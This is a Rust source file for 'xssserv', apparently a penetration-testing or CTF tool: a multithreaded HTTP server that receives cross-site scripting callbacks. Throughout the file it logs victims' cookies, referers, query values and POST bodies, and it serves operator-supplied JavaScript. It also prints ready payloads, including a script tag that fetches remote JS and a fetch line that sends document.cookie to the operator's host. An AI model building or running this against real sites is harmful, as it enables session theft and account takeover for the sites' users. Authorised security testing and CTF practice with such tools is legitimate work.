//! xssserv - XSS 回调接收服务器 (std::net 手写多线程 HTTP)
//! 记录 cookie/路径/来源; 支持注入自定义 JS

use clap::Parser;
use common::{exit, finish, Mode, Out};
use serde::Serialize;
use std::fs::OpenOptions;
use std::io::{BufRead, BufReader, Write};
use std::net::{TcpListener, TcpStream};
use std::process::ExitCode;
use std::sync::Arc;
use std::thread;
use std::time::Duration;

const SIGINT: i32 = 2;
const MAX_HEADER_BYTES: usize = 64 * 1024;
const MAX_BODY_BYTES: usize = 16 * 1024 * 1024;
const HTML_PAGE: &str =
    "<html><body><h1>xssserv</h1><p>callback received. check terminal.</p></body></html>";

extern "C" {
    fn localtime_r(timep: *const i64, result: *mut Tm) -> *mut Tm;
    fn signal(signum: i32, handler: extern "C" fn(i32)) -> usize;
    fn write(fd: i32, buf: *const u8, count: usize) -> isize;
    fn _exit(status: i32) -> !;
}

#[repr(C)]
#[derive(Default)]
#[allow(dead_code)]
struct Tm {
    tm_sec: i32,
    tm_min: i32,
    tm_hour: i32,
    tm_mday: i32,
    tm_mon: i32,
    tm_year: i32,
    tm_wday: i32,
    tm_yday: i32,
    tm_isdst: i32,
    tm_gmtoff: i64,
    tm_zone: *const i8,
}

#[derive(Parser, Debug)]
#[command(
    name = "xssserv",
    version,
    about = "XSS 回调接收服务器(零依赖)",
    long_about = "用途: 靶机浏览器访问 XSS 时回连, 记录 cookie/路径/来源; 支持注入自定义 JS\n\n退出码: 0=成功 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// 监听端口
    #[arg(long, default_value_t = 8000)]
    port: u16,

    /// 记录文件
    #[arg(long, default_value = "")]
    out: String,

    /// 返回给请求方的 JS(默认空, 即不执行)
    #[arg(long, default_value = "")]
    page: String,

    /// 所有请求都返回 JS 而非 HTML
    #[arg(long)]
    all: bool,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize)]
struct Startup<'a> {
    event: &'static str,
    listen: String,
    port: u16,
    out: &'a str,
    page: &'a str,
    all: bool,
    hints: Vec<String>,
}

#[derive(Serialize)]
struct Capture {
    event: &'static str,
    time: String,
    ip: String,
    method: String,
    path: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    cookie: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    referer: Option<String>,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    params: Vec<(String, String)>,
    #[serde(skip_serializing_if = "Option::is_none")]
    body: Option<String>,
}

struct Config {
    js: Vec<u8>,
    out_file: String,
    inject_all: bool,
    json: bool,
}

extern "C" fn on_sigint_human(_sig: i32) {
    let msg = "\n[*] 退出\n";
    unsafe {
        write(2, msg.as_ptr(), msg.len());
        _exit(0);
    }
}

extern "C" fn on_sigint_json(_sig: i32) {
    let msg = "{\"event\":\"stop\"}\n";
    unsafe {
        write(2, msg.as_ptr(), msg.len());
        _exit(0);
    }
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    let args = Args::parse();
    let out = Out::new(Mode::from_flag(args.json));

    let listener = match TcpListener::bind(("0.0.0.0", args.port)) {
        Ok(l) => l,
        Err(e) => {
            if out.json() {
                let v = serde_json::json!({ "error": format!("端口 {} 绑定失败: {e}", args.port) });
                eprintln!("{v}");
            } else {
                eprintln!("[-] 端口 {} 绑定失败: {e}", args.port);
            }
            return finish(exit::ERROR);
        }
    };

    unsafe {
        let handler: extern "C" fn(i32) = if out.json() {
            on_sigint_json
        } else {
            on_sigint_human
        };
        signal(SIGINT, handler);
    }

    let hints = hints(&args.page, args.port);
    if out.json() {
        let startup = Startup {
            event: "start",
            listen: format!("0.0.0.0:{}", args.port),
            port: args.port,
            out: args.out.as_str(),
            page: args.page.as_str(),
            all: args.all,
            hints,
        };
        match serde_json::to_string(&startup) {
            Ok(s) => eprintln!("{s}"),
            Err(_) => eprintln!("{{\"event\":\"start\",\"port\":{}}}", args.port),
        }
    } else {
        println!("[*] xssserv 监听 0.0.0.0:{}", args.port);
        if hints.len() == 2 {
            println!("[*] JS payload: {}", hints[0]);
            println!("[*] 或直接: {}", hints[1]);
        }
        println!("[*] Ctrl-C 退出");
    }

    let cfg = Arc::new(Config {
        js: args.page.into_bytes(),
        out_file: args.out,
        inject_all: args.all,
        json: out.json(),
    });

    for conn in listener.incoming() {
        match conn {
            Ok(stream) => {
                let cfg = Arc::clone(&cfg);
                thread::spawn(move || handle(stream, &cfg));
            }
            Err(_) => thread::sleep(Duration::from_millis(10)),
        }
    }
    finish(exit::OK)
}

fn hints(page: &str, port: u16) -> Vec<String> {
    if page.is_empty() {
        return Vec::new();
    }
    vec![
        format!("<script src='http://<你的IP>:{port}/x.js'></script>"),
        format!("<script>fetch('http://<你的IP>:{port}/c?c='+document.cookie)</script>"),
    ]
}

fn handle(stream: TcpStream, cfg: &Config) {
    let _ = stream.set_read_timeout(Some(Duration::from_secs(60)));
    let _ = stream.set_write_timeout(Some(Duration::from_secs(60)));
    let ip = stream
        .peer_addr()
        .map(|a| a.ip().to_string())
        .unwrap_or_else(|_| "0.0.0.0".to_string());

    let mut reader = BufReader::new(&stream);
    let mut total = 0usize;

    let mut line = Vec::new();
    match read_line(&mut reader, &mut line, &mut total) {
        Ok(0) | Err(_) => return,
        Ok(_) => {}
    }
    let request = String::from_utf8_lossy(&line);
    let request = request.trim_end_matches(['\r', '\n']);
    let mut parts = request.split_whitespace();
    let method = parts.next().unwrap_or("").to_string();
    let target = parts.next().unwrap_or("/").to_string();

    let mut headers: Vec<(String, String)> = Vec::new();
    loop {
        let mut hline = Vec::new();
        match read_line(&mut reader, &mut hline, &mut total) {
            Ok(0) => break,
            Ok(_) => {}
            Err(_) => return,
        }
        let s = String::from_utf8_lossy(&hline);
        let s = s.trim_end_matches(['\r', '\n']);
        if s.is_empty() {
            break;
        }
        if let Some((k, v)) = s.split_once(':') {
            headers.push((k.trim().to_string(), v.trim().to_string()));
        }
    }

    let body = if method == "POST" {
        read_body(&mut reader, &headers)
    } else {
        Vec::new()
    };

    match method.as_str() {
        "GET" => {
            record(cfg, &ip, &method, &target, &headers, &[]);
            let path = target.split('?').next().unwrap_or("/");
            if path.ends_with(".js") || path.ends_with(".x.js") || cfg.inject_all {
                respond(
                    &stream,
                    "200 OK",
                    Some("application/javascript"),
                    true,
                    &cfg.js,
                );
            } else {
                respond(
                    &stream,
                    "200 OK",
                    Some("text/html"),
                    false,
                    HTML_PAGE.as_bytes(),
                );
            }
        }
        "POST" => {
            record(cfg, &ip, &method, &target, &headers, &body);
            respond(&stream, "200 OK", None, false, b"ok");
        }
        _ => {
            let page = format!(
                "<html><head><title>Error response</title></head><body><h1>Error response</h1><p>Error code: 501</p><p>Message: Unsupported method ('{method}').</p></body></html>"
            );
            respond(
                &stream,
                "501 Unsupported method",
                Some("text/html;charset=utf-8"),
                false,
                page.as_bytes(),
            );
        }
    }
}

fn read_line(
    reader: &mut impl BufRead,
    buf: &mut Vec<u8>,
    total: &mut usize,
) -> std::io::Result<usize> {
    let n = reader.read_until(b'\n', buf)?;
    *total += n;
    if *total > MAX_HEADER_BYTES {
        return Err(std::io::Error::new(
            std::io::ErrorKind::InvalidData,
            "header too large",
        ));
    }
    Ok(n)
}

fn read_body(reader: &mut impl BufRead, headers: &[(String, String)]) -> Vec<u8> {
    let len = header(headers, "content-length")
        .and_then(|v| v.trim().parse::<usize>().ok())
        .unwrap_or(0)
        .min(MAX_BODY_BYTES);
    let mut buf = vec![0u8; len];
    let mut read = 0usize;
    while read < len {
        match reader.read(&mut buf[read..]) {
            Ok(0) => break,
            Ok(n) => read += n,
            Err(_) => break,
        }
    }
    buf.truncate(read);
    buf
}

fn respond(
    stream: &TcpStream,
    status: &str,
    content_type: Option<&str>,
    cors: bool,
    body: &[u8],
) {
    let mut head = format!("HTTP/1.1 {status}\r\nServer: xssserv/1.0\r\n");
    if let Some(ct) = content_type {
        head.push_str(&format!("Content-Type: {ct}\r\n"));
    }
    if cors {
        head.push_str("Access-Control-Allow-Origin: *\r\n");
    }
    head.push_str(&format!(
        "Content-Length: {}\r\nConnection: close\r\n\r\n",
        body.len()
    ));
    let mut out = Vec::with_capacity(head.len() + body.len());
    out.extend_from_slice(head.as_bytes());
    out.extend_from_slice(body);
    let mut w = stream;
    let _ = w.write_all(&out);
    let _ = w.flush();
}

fn record(
    cfg: &Config,
    ip: &str,
    method: &str,
    target: &str,
    headers: &[(String, String)],
    body: &[u8],
) {
    let ts = timestamp();
    let params = parse_params(target);
    let cookie = header(headers, "cookie").map(str::to_string);
    let referer = header(headers, "referer").map(str::to_string);
    let body_text = body_text(body);

    let mut line = format!("[{ts}] {ip} {method} {target}");
    if let Some(c) = &cookie {
        line += &format!("\n    Cookie: {c}");
    }
    if let Some(r) = &referer {
        line += &format!("\n    Referer: {r}");
    }
    for (k, v) in &params {
        line += &format!("\n    {k} = {v}");
    }
    if let Some(b) = &body_text {
        line += &format!("\n    Body: {b}");
    }

    if cfg.json {
        let cap = Capture {
            event: "capture",
            time: ts,
            ip: ip.to_string(),
            method: method.to_string(),
            path: target.to_string(),
            cookie,
            referer,
            params,
            body: body_text,
        };
        if let Ok(s) = serde_json::to_string(&cap) {
            let mut o = std::io::stdout().lock();
            let _ = writeln!(o, "{s}");
            let _ = o.flush();
        }
    } else {
        let mut o = std::io::stdout().lock();
        let _ = writeln!(o, "{line}");
        let _ = o.flush();
    }

    if !cfg.out_file.is_empty() {
        if let Ok(mut f) = OpenOptions::new()
            .create(true)
            .append(true)
            .open(&cfg.out_file)
        {
            let _ = writeln!(f, "{line}");
        } else {
            eprintln!("[-] 无法写入记录文件: {}", cfg.out_file);
        }
    }
}

fn header<'a>(headers: &'a [(String, String)], name: &str) -> Option<&'a str> {
    headers
        .iter()
        .find(|(k, _)| k.eq_ignore_ascii_case(name))
        .map(|(_, v)| v.as_str())
}

fn parse_params(target: &str) -> Vec<(String, String)> {
    let query = match target.split_once('?') {
        Some((_, q)) => q,
        None => return Vec::new(),
    };
    let mut out: Vec<(String, String)> = Vec::new();
    for pair in query.split('&') {
        if pair.is_empty() {
            continue;
        }
        let (raw_k, raw_v) = pair.split_once('=').unwrap_or((pair, ""));
        let key = url_decode(raw_k);
        let value = url_decode(raw_v);
        if value.is_empty() {
            continue;
        }
        let kl = key.to_ascii_lowercase();
        if !matches!(kl.as_str(), "c" | "cookie" | "flag" | "data" | "x") {
            continue;
        }
        if out.iter().any(|(k, _)| *k == key) {
            continue;
        }
        out.push((key, value));
    }
    out
}

fn url_decode(s: &str) -> String {
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        match bytes[i] {
            b'+' => {
                out.push(b' ');
                i += 1;
            }
            b'%' if i + 2 < bytes.len() => match (hex_val(bytes[i + 1]), hex_val(bytes[i + 2])) {
                (Some(h), Some(l)) => {
                    out.push((h << 4) | l);
                    i += 3;
                }
                _ => {
                    out.push(b'%');
                    i += 1;
                }
            },
            b => {
                out.push(b);
                i += 1;
            }
        }
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

fn body_text(body: &[u8]) -> Option<String> {
    if body.is_empty() || body.starts_with(b"%PDF") {
        return None;
    }
    let end = body.len().min(400);
    let text = String::from_utf8_lossy(&body[..end]).into_owned();
    if text.trim().is_empty() {
        None
    } else {
        Some(text)
    }
}

fn timestamp() -> String {
    let secs = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() as i64)
        .unwrap_or(0);
    let mut tm = Tm::default();
    unsafe {
        localtime_r(&secs, &mut tm);
    }
    format!("{:02}:{:02}:{:02}", tm.tm_hour, tm.tm_min, tm.tm_sec)
}
